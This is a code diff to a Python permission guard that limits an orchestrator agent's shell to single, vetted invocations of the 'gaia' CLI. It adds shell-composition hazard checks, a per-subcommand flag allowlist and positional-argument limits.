+    """
+    quote = ""
+    for i, ch in enumerate(command):
+        nxt = command[i + 1:i + 2]
+        if quote == "'":
+            hazard = None
+        elif quote == '"':
+            hazard = None if ch == '"' else _double_quoted_hazard(ch, nxt)
+        elif ch in "'\"":
+            hazard = None
+        else:
+            hazard = _unquoted_character_hazard(command[i - 1:i], ch, nxt)
+        if hazard is not None:
+            return hazard
+        if ch in "'\"" and quote in ("", ch):
+            quote = "" if quote else ch
+    if quote:
+        return "unterminated quote detected"
+    return None
+
 
 def is_orchestrator_role(hook_payload: Dict[str, Any]) -> bool:
     """Return True iff *hook_payload* classifies as the ORCHESTRATOR role.
 
     Delegates entirely to ``delegate_mode.classify_session_role`` -- the one
     place Gaia's (agent_id, agent_type) taxonomy lives -- rather than
-    inspecting either field directly here. Imported lazily (function-local),
-    matching the convention already used at this module's real call site
-    (``hooks/adapters/claude_code.py`` imports
-    ``modules.orchestrator.delegate_mode`` the same way) and avoiding any
-    import-order assumption between the two packages.
+    inspecting either field directly here. The import is function-local so
+    neither package has to finish initializing before the other.
     """
     from ..orchestrator.delegate_mode import SessionRole, classify_session_role
 
     return classify_session_role(hook_payload) is SessionRole.ORCHESTRATOR
 
-
-# ---------------------------------------------------------------------------
-# Main entry point
-# ---------------------------------------------------------------------------
 
 def check(
     command: str,
@@ -903,15 +784,6 @@ def check(
     if not command or not command.strip():
         return False, "Empty command is not an allowlisted gaia CLI invocation."
 
-    hazard = _find_composition_hazard(command)
-    if hazard is not None:
-        return False, (
-            f"GAIA CLI ONLY: {hazard} in orchestrator command. The orchestrator "
-            f"may run only single, trusted invocations of the gaia CLI -- "
-            f"background execution and process substitution both run more "
-            f"than the gaia CLI and are denied outright, not approvable."
-        )
-
     decomposed = StageDecomposer().decompose(command)
 
     if decomposed.substitutions:
@@ -923,6 +795,21 @@ def check(
             "the orchestrator may run only the gaia CLI, exclusively, with "
             "nothing else executing to feed it. Denied outright, not "
             "approvable."
+        )
+
+    program = _quoted_program_word(command)
+    hazard = _find_composition_hazard(command[program[1]:] if program else command)
+    if hazard is None and program and (
+        not decomposed.stages or decomposed.stages[0].args[:1] != [program[0]]
+    ):
+        hazard = "backslash inside double quotes detected"
+    if hazard is not None:
+        return False, (
+            f"GAIA CLI ONLY: {hazard} in orchestrator command. The orchestrator's "
+            f"Bash runs one gaia invocation, not a shell: gaia must receive "
+            f"exactly the words written, and its output already returns "
+            f"through the tool, so no redirect is needed. Denied outright, "
+            f"not approvable."
         )
 
     if not decomposed.stages:
@@ -962,17 +849,11 @@ def _check_stage(stage) -> Tuple[bool, Optional[str]]:
 
     rest = args[1:]
 
-    # Bare `gaia` (no subcommand at all) and `-h`/`--help` ANYWHERE in the
-    # remaining tokens are unconditionally read -- see _is_help_or_bare_stage
-    # for why this is provably safe rather than merely convenient, including
-    # on an otherwise-mutative verb (`gaia install --help`): argparse's own
-    # help action fires eagerly during parsing and exits before any
-    # subcommand handler ever runs, so the underlying write never executes
-    # either way. Checked BEFORE the allowlist/deny-list so the orchestrator's
-    # own contract (mechanical reads, including "what can I even run") is
-    # never blocked by the verb it is trying to look up -- and so the error
-    # message below, which recommends `gaia --help`, never recommends a
-    # command that is itself denied.
+    # Bare `gaia` and `-h`/`--help` anywhere in the remaining tokens are reads,
+    # even on a mutative verb (`gaia install --help`): argparse's help action
+    # exits during parsing, before any handler runs. Checked before the
+    # allowlist and deny-list so the denial below, which recommends
+    # `gaia --help`, never recommends a command that is itself denied.
     if _is_help_or_bare_stage(rest):
         return True, None
 
@@ -991,6 +872,12 @@ def _check_stage(stage) -> Tuple[bool, Optional[str]]:
         if invalid is not None:
             return False, invalid
         invalid = _validate_orchestrator_write(candidate, allowed_phrase)
+        if invalid is not None:
+            return False, invalid
+        invalid = _validate_known_safe_flags(candidate, allowed_phrase, leading_flags)
+        if invalid is not None:
+            return False, invalid
+        invalid = _validate_positional_count(candidate, allowed_phrase)
         if invalid is not None:
             return False, invalid
         return True, None
@@ -1016,10 +903,10 @@ _HELP_LONG_FLAG = "--help"
 def _is_help_token(token: str) -> bool:
     """True iff *token* is, or unambiguously abbreviates, `-h`/`--help`.
 
-    Mirrors `_forbidden_flag_hit`'s already-verified-against-argparse
-    abbreviation handling (`allow_abbrev` defaults True, and a parser that
-    turns it off only makes the match stricter) rather than inventing a second one: `--hel`/`--he`
-    parse to the help action exactly as `--fi`/`--f` parse to `--fix` there.
+    Abbreviation follows argparse's default `allow_abbrev=True`, as in
+    `_forbidden_flag_hit` (a parser that turns it off only makes the match
+    stricter): `--hel`/`--he` parse to the help action as `--fi`/`--f` parse
+    to `--fix` there.
     The `=value` split via `_option_name` also means a token like
     `--description=--help` (a VALUE that merely looks like the flag, verified
     empirically to NOT trigger argparse's help action) correctly does not
@@ -1052,9 +939,6 @@ def _is_help_or_bare_stage(rest: Tuple[str, ...]) -> bool:
     return any(_is_help_token(token) for token in rest)
 
 
-# ---------------------------------------------------------------------------
-# Flag-level policy for admitted read verbs (Design decision 4)
-# ---------------------------------------------------------------------------
 # A phrase is matched by PREFIX, so admitting ("doctor",) admits every token
 # that follows it -- including a flag that changes what the verb DOES. This
 # table is how a read verb that becomes a writer under one flag is expressed.
@@ -1152,6 +1036,281 @@ def _validate_read_flags(
             f"for the repair. Denied outright, not approvable."
         )
     return None
+
+
+_FlagGrammar = Tuple[FrozenSet[str], FrozenSet[str]]
+
+
+def _flags(valued: str, valueless: str = "") -> _FlagGrammar:
+    return frozenset(valued.split()), frozenset(valueless.split())
+
+
+# An option absent here is refused until vetted; test_orchestrator_flag_lane.py pins this table
+# to the live parsers, with the defined options withheld on purpose listed in its WITHHELD.
+_FLAG_GRAMMAR: Dict[Tuple[str, ...], _FlagGrammar] = {
+    ("approvals", "history"): _flags("--limit --status", "--json"),
+    ("approvals", "list"): _flags("--session", "--json --orphans-only --all-sessions --include-stale"),
+    ("approvals", "pending"): _flags("--session", "--json --all-sessions --include-stale"),
+    ("approvals", "question"): _flags("", "--details"),
+    ("approvals", "reject"): _flags("--reason", "--json"),
+    ("approvals", "request-set"): _flags(
+        "--command --what --question --does --impact --cwd --expect-exit --rationale "
+        "--verification --shared-state --rollback --agent-id", "--json"),
+    ("approvals", "revoke"): _flags("--reason", "--yes"),
+    ("approvals", "show"): _flags("", "--json --consent-surface"),
+    ("approvals", "stats"): _flags("", "--json"),
+    ("brief", "ac", "add"): _flags(
+        "--id --description --description-file --evidence-type --evidence-shape "
+        "--evidence-shape-file --artifact --workspace", "--json"),
+    ("brief", "ac", "edit"): _flags(
+        "--id --description --description-file --evidence-type --evidence-shape "
+        "--evidence-shape-file --artifact --workspace", "--json"),
+    ("brief", "ac", "remove"): _flags("--id --workspace", "--json"),
+    ("brief", "close"): _flags("--workspace"),
+    ("brief", "decision", "add"): _flags("--text --rationale --supersedes --workspace", "--json"),
+    ("brief", "decision", "list"): _flags("--workspace", "--json"),
+    ("brief", "deps"): _flags("--workspace", "--json"),
+    ("brief", "edit"): _flags(
+        "--workspace --field --content --content-file", "--headless --append --json"),
+    ("brief", "history"): _flags("--workspace", "--json"),
+    ("brief", "list"): _flags("--status --format --workspace", "--json"),
+    ("brief", "new"): _flags(
+        "--workspace --project --title --objective --objective-file "
+        "--context --context-file --approach --approach-file --out-of-scope "
+        "--out-of-scope-file --status --surface-type", "--headless --json"),
+    ("brief", "search"): _flags("--limit --workspace", "--json"),
+    ("brief", "set-project"): _flags("--workspace", "--clear --force --dry-run --json"),
+    ("brief", "set-status"): _flags("--workspace", "--json"),
+    ("brief", "show"): _flags("--workspace", "--json"),
+    ("brief", "verify"): _flags("--workspace", "--json"),
+    ("context", "accept"): _flags("--workspace", "--dry-run --json"),
+    ("context", "get"): _flags("--workspace --section", "--json --text --include-missing"),
+    ("context", "get-contract"): _flags("--workspace --project --section", "--json --text"),
+    ("context", "project"): _flags("--workspace", "--json"),
+    ("context", "scan"): _flags("", "--dry-run --json"),
+    ("context", "show"): _flags("--section", "--json"),
+    ("contract", "list"): _flags(
+        "--plan-task --brief --agent-id --agent --state --cut --session --contract-id "
+        "--harness-id --workspace --since --until --limit --grep --agent-name --task", "--json"),
+    ("contract", "validate"): _flags("--draft-id --agent-id", "--json"),
+    ("contract", "proposals", "list"): _flags("--kind --contract-id", "--all --json"),
+    ("contract", "proposals", "accept"): _flags("--project --workspace", "--json"),
+    ("contract", "proposals", "dismiss"): _flags("--reason", "--json"),
+    ("contract", "view"): _flags(
+        "--field --draft-id --agent-id --harness-id --contract-id", "--row --json"),
+    ("defects",): _flags(
+        "--origin --type --severity --agent --since --until --limit --workspace", "--count --json"),
+    ("doctor",): _flags("--workspace", "--json"),
+    ("evidence", "list"): _flags("--brief --ac --workspace", "--json"),
+    ("evidence", "show"): _flags("", "--json"),
+    ("history",): _flags("--agent -a --limit -n --workspace", "--today -t --blocked -b --json"),
+    ("memory", "add"): _flags(
+        "--name --type --body --body-file --description --project --project-ref "
+        "--initiative --class --status --measured-at --method --kind --until "
+        "--binary --replaces --surface --workspace", "--json"),
+    ("memory", "append"): _flags("--body --body-file --workspace", "--json"),
+    ("memory", "checkpoint"): _flags(
+        "--file --project --project-ref --initiative --workspace", "--json"),
+    ("memory", "conflicts"): _flags("--threshold --owner --exclude-class --limit", "--json"),
+    ("memory", "declare"): _flags(
+        "--binary --project --command --effect --workspace", "--withdraw --json"),
+    ("memory", "episode-show"): _flags("", "--json"),
+    ("memory", "get-relevant"): _flags(
+        "--workspace --limit --max-chars --types --sections --initiative --project --group",
+        "--json --no-pointer"),
+    ("memory", "link"): _flags("--kind --workspace --from-file", "--json"),
+    ("memory", "list"): _flags(
+        "--type --kind --class --status --sort --order --workspace --limit --format",
+        "--include-superseded --include-user --json"),
+    ("memory", "move"): _flags(
+        "--to --type --workspace --initiative --project --kind --from --from-file", "--json"),
+    ("memory", "reclassify"): _flags(
+        "--class --status --surface --workspace --from --from-file", "--json"),
+    ("memory", "search"): _flags(
+        "--limit --scope --type --class --workspace", "--all --include-superseded --json"),
+    ("memory", "show"): _flags("--workspace", "--links --history --no-count --json"),
+    ("memory", "stats"): _flags("", "--json"),
+    ("memory", "story"): _flags("--max-depth --workspace", "--json"),
+    ("metrics",): _flags("--agent --workspace --range --since --until", "--json"),
+    ("notifications", "ack"): _flags("--workspace", "--all --json"),
+    ("notifications", "add"): _flags(
+        "--kind --task --headline --body --session-id --at --cron --every --skill "
+        "--memory --project --workspace", "--json"),
+    ("notifications", "cancel"): _flags("", "--json"),
+    ("notifications", "list"): _flags(
+        "--limit --workspace", "--unread --upcoming --all-workspaces --json"),
+    ("notifications", "show"): _flags("", "--json"),
+    ("notifications", "snooze"): _flags("--for --until", "--json"),
+    ("lint", "comments"): _flags("--repo --head --base", "--json"),
+    ("now",): _flags("", "--json"),
+    ("open",): _flags("", "--line --json"),
+    ("map",): _flags(""),
+    ("paths",): _flags(""),
+    ("plan", "change", "approve"): _flags("--workspace", "--json"),
+    ("plan", "change", "list"): _flags("--workspace", "--json"),
+    ("plan", "change", "request"): _flags("--reason --workspace", "--json"),
+    ("plan", "history"): _flags("--workspace", "--content --json"),
+    ("plan", "list"): _flags("--brief --status --format --workspace", "--json"),
+    ("plan", "pause"): _flags("--reason --workspace", "--json"),
+    ("plan", "resume"): _flags("--workspace", "--json"),
+    ("plan", "set-status"): _flags("--workspace", "--json"),
+    ("plan", "show"): _flags("--workspace", "--json"),
+    ("query",): _flags(
+        "--surface --workspace --since --until --last --agent --type --command-like "
+        "--group-by --format", "--failed --count --snippets --metrics --json"),
+    ("scan",): _flags("--workspace", "--dry-run --json"),
+    ("session", "preview"): _flags("--session-id"),
+    ("session", "resume-point", "set"): _flags("--session-id --text"),
+    ("session", "snapshot"): _flags("--session-id", "--json"),
+    ("signals",): _flags("--since --limit", "--json"),
+    ("status",): _flags("", "--json"),
+    ("task", "gate", "list"): _flags("--workspace", "--json"),
+    ("task", "gate", "reverify"): _flags("--reason --workspace", "--json"),
+    ("task", "list"): _flags("--status --format --workspace --plan", "--json"),
+    ("task", "set-status"): _flags("--workspace", "--json"),
+    ("task", "show"): _flags("--id --workspace", "--json"),
+    ("usage", "show"): _flags("--plan --session --since --until", "--json"),
+    ("workspace", "current"): _flags(""),
+    ("workspace", "info"): _flags(""),
+    ("worktree", "list"): _flags("--repo", "--json"),
+    ("worktree", "show"): _flags("", "--json"),
+    ("worktree", "show-capture"): _flags("", "--diff --json"),
+}
+_KNOWN_SAFE_FLAGS: Dict[Tuple[str, ...], FrozenSet[str]] = {
+    phrase: valued | valueless for phrase, (valued, valueless) in _FLAG_GRAMMAR.items()
+}
+_VALUELESS_FLAGS: Dict[Tuple[str, ...], FrozenSet[str]] = {
+    phrase: valueless for phrase, (_, valueless) in _FLAG_GRAMMAR.items()
+}
+
+# The positional count argparse demands exactly, for the phrases where it is
+# fixed; the test that pins _FLAG_GRAMMAR pins this table too.
+_FIXED_POSITIONALS: Dict[Tuple[str, ...], int] = {
+    **dict.fromkeys([
+        ("approvals", "list"), ("approvals", "pending"), ("approvals", "request-set"),
+        ("approvals", "stats"), ("brief", "list"), ("context", "get"), ("context", "get-contract"),
+        ("context", "scan"), ("context", "show"), ("contract", "proposals", "list"),
+        ("contract", "validate"), ("contract", "view"), ("defects",), ("doctor",),
+        ("evidence", "list"), ("history",), ("lint", "comments"), ("memory", "add"),
+        ("memory", "checkpoint"), ("memory", "conflicts"), ("memory", "declare"), ("memory", "get-relevant"),
+        ("memory", "list"), ("memory", "stats"), ("metrics",), ("notifications", "add"),
+        ("notifications", "list"), ("now",), ("plan", "list"), ("query",),
+        ("session", "preview"), ("session", "resume-point", "set"),
+        ("session", "snapshot"), ("signals",), ("status",), ("usage", "show"),
+        ("workspace", "current"), ("workspace", "info"), ("worktree", "list"),
+    ], 0),
+    **dict.fromkeys([
+        ("approvals", "revoke"), ("approvals", "show"), ("brief", "ac", "add"),
+        ("brief", "ac", "edit"), ("brief", "ac", "remove"), ("brief", "close"),
+        ("brief", "decision", "add"), ("brief", "decision", "list"), ("brief", "deps"),
+        ("brief", "edit"), ("brief", "history"), ("brief", "search"), ("brief", "show"),
+        ("brief", "verify"), ("context", "accept"), ("context", "project"),
+        ("contract", "proposals", "accept"), ("contract", "proposals", "dismiss"),
+        ("evidence", "show"), ("memory", "append"), ("memory", "episode-show"),
+        ("memory", "search"), ("memory", "show"),
+        ("memory", "story"), ("notifications", "cancel"), ("notifications", "show"),
+        ("notifications", "snooze"), ("open",), ("plan", "change", "list"),
+        ("plan", "change", "request"), ("plan", "history"), ("plan", "pause"),
+        ("plan", "resume"), ("plan", "show"), ("worktree", "show"),
+        ("worktree", "show-capture"),
+    ], 1),
+    **dict.fromkeys([
+        ("brief", "set-status"), ("plan", "change", "approve"), ("plan", "set-status"),
+        ("task", "gate", "list"),
+    ], 2),
+    **dict.fromkeys([("task", "gate", "reverify"), ("task", "set-status")], 3),
+}
+
+# The root parser's own options: --json may precede the subcommand, --version
+# only stands alone (ALLOWED_BARE_READ_FLAGS) and -h/--help never reaches here.
+_KNOWN_SAFE_LEADING_FLAGS: FrozenSet[str] = frozenset({"--json"})
+
+_NEGATIVE_NUMBER = re.compile(r"^-\d+$|^-\d*\.\d+$")
+
+
+def _is_option_like(token: str) -> bool:
+    """True iff argparse would read *token* as an option rather than a value.
+
+    A value that starts with a dash and contains a space (``- a bullet``) or is
+    a negative number is a value to argparse, so it must be one here too; a lone
+    ``-`` and ``--`` are not special-cased: ``--`` is option-like and refused,
+    which also closes the demotion of a later flag to a positional.
+    """
+    name = token.split("=", 1)[0]
+    return (
+        len(name) > 1
+        and name[0] == "-"
+        and not _NEGATIVE_NUMBER.match(name)
+        and not any(ch.isspace() for ch in name)
+    )
+
+
+def _validate_known_safe_flags(
+    candidate: Tuple[str, ...],
+    phrase: Tuple[str, ...],
+    leading_flags: Tuple[str, ...] = (),
+) -> Optional[str]:
+    """Deny an option the admitted *phrase* is not known to be safe with.
+
+    Matching is by exact option name, never by abbreviation: ``--wor`` parses
+    to ``--workspace`` in argparse, but an abbreviation is a spelling nobody
+    vetted. Returns None when every option is known safe, else the denial.
+    """
+    safe = _KNOWN_SAFE_FLAGS.get(phrase, frozenset())
+    valueless = _VALUELESS_FLAGS.get(phrase, frozenset())
+    scanned = [(t, _KNOWN_SAFE_LEADING_FLAGS, _KNOWN_SAFE_LEADING_FLAGS) for t in leading_flags]
+    scanned += [(t, safe, valueless) for t in candidate[len(phrase):]]
+    for token, known, takes_no_value in scanned:
+        if not _is_option_like(token):
+            continue
+        name, eq, _ = token.partition("=")
+        if eq and name in takes_no_value:
+            return (
+                f"GAIA CLI ONLY: '{name}' takes no value on 'gaia {' '.join(phrase)}', "
+                f"so '{token}' is refused. Pass the flag alone. Denied outright, "
+                f"not approvable."
+            )
+        if name in known:
+            continue
+        return (
+            f"GAIA CLI ONLY: '{name}' is not a known-safe flag of "
+            f"'gaia {' '.join(phrase)}'. The orchestrator's lane is closed by "
+            f"default at flag level: an admitted verb carries only the options "
+            f"vetted for it (see _KNOWN_SAFE_FLAGS), and the rest belong to a "
+            f"specialist or a signed operation. Denied outright, not approvable."
+        )
+    return None
+
+
+def _positional_count(args: Tuple[str, ...], valueless: FrozenSet[str]) -> int:
+    """Count *args* argparse would bind to positionals, skipping each flag's value."""
+    count = 0
+    i = 0
+    while i < len(args):
+        token = args[i]
+        if not _is_option_like(token):
+            count += 1
+        elif "=" not in token and token not in valueless:
+            i += 1
+        i += 1
+    return count
+
+
+def _validate_positional_count(
+    candidate: Tuple[str, ...], phrase: Tuple[str, ...]
+) -> Optional[str]:
+    """Deny more positionals than an admitted *phrase* with a fixed count takes."""
+    expected = _FIXED_POSITIONALS.get(phrase)
+    if expected is None:
+        return None
+    found = _positional_count(candidate[len(phrase):], _VALUELESS_FLAGS[phrase])
+    if found <= expected:
+        return None
+    return (
+        f"GAIA CLI ONLY: 'gaia {' '.join(phrase)}' takes {expected} positional "
+        f"argument(s) and was given {found}. Run one invocation per reference. "
+        f"Denied outright, not approvable."
+    )
 
 
 _BRIEF_STATUSES = frozenset({"draft", "open", "in-progress", "closed", "archived"})
@@ -1267,7 +1426,7 @@ def _validate_orchestrator_write(
         valid = len(args) >= 2 and not args[0].startswith("-") and args[1] in _PLAN_STATUSES
     elif phrase in (("plan", "pause"), ("plan", "change", "request")):
         valid = bool(args) and not args[0].startswith("-") and _has_value(args, "--reason")
-    elif phrase == ("plan", "resume"):
+    elif phrase in (("plan", "resume"), ("context", "accept")):
         valid = bool(args) and not args[0].startswith("-")
     elif phrase == ("plan", "change", "approve"):
         valid = len(args) >= 2 and not args[0].startswith("-") and args[1].isdigit()
@@ -1348,9 +1507,9 @@ def _validate_orchestrator_write(
         # this spelling reaches it.
         return _explicitly_denied_reason(("memory", "add", "--replace"))
     else:
-        # Memory's curator verbs, the two `scan` spellings and `paths` retain
-        # their own mature CLI validation -- there is no coordination-shaped
-        # subset of them for this guard to enforce.
+        # No coordination-shaped subset to enforce here (memory writes, the two
+        # `scan` spellings, `paths`, proposal accept/dismiss, `approvals
+        # request-set`): their own CLI validation and the flag gates apply.
         return None
 
     if valid:
